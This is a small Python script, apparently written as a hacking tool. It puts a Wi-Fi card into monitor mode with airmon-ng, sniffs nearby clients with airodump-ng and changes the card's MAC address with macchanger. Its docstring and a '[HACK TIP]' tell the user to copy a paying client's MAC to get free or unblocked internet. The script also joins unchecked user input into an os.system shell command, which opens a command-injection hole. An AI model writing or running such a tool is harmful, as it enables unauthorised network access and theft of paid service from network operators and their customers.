#!/usr/bin/env python
'''
This script automates the whole proccess of spoofing mac address for
recon or getting unblocked/free wifi
'''
import subprocess			# Subprocess for Shell CMD
import os 					# OS Library

# COLOR LIBRARY
class colors:
    PURPL = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# Function for calling shellscripts within python script
def cmd(cmd):
	os.system(cmd)


cmd('clear')

print colors.BOLD + 'Starting Monitor mode...' + colors.WHITE
print colors.YELLOW + 'be patient, this will take some time' + colors.WHITE
cmd('sleep 2')


cmd('ifconfig wlan0 up')
print colors.GREEN+'All Done!'+colors.WHITE
cmd('airmon-ng start wlan0')
cmd('clear')
print colors.GREEN+ 'PRESS [CTRL] + [C] to stop Monitor Mode...' + colors.WHITE
print 
print colors.BOLD+'[HACK TIP]'+colors.WHITE
print 'In Monitor mode, wait till you get enough frames.'
print 'Then copy that mac address and use it as your own to fool payed intern.'
cmd('sleep 4')

cmd('airodump-ng mon0')

#open new terminal window with specific monitor
#mon_ap = raw_input(colors.PURPL+'Target Station BSSID Mac Address: '+colors.WHITE)
#cmd('gnome-terminal -e sh -c "airmon-ng --bssid "+mon_ap+"; bash"')


print colors.YELLOW+'turning off wlan0 and mon0'+colors.WHITE
cmd('ifconfig wlan0 down')
cmd('ifconfig mon0 down')


mac = raw_input(colors.RED+'Change MAC Address to: '+colors.WHITE)


cmd('macchanger -m '+mac+' wlan0')
print colors.YELLOW+'waking up wlan0...'+colors.WHITE
cmd('sleep 2.5')
cmd('ifconfig wlan0 up')
cmd('ifconfig mon1 down')
cmd('ifconfig mon2 down')
cmd('ifconfig mon3 down')
print colors.GREEN+'All Done! - Turn on/off Wi-Fi'+colors.WHITE
cmd('ifconfig | grep wlan0')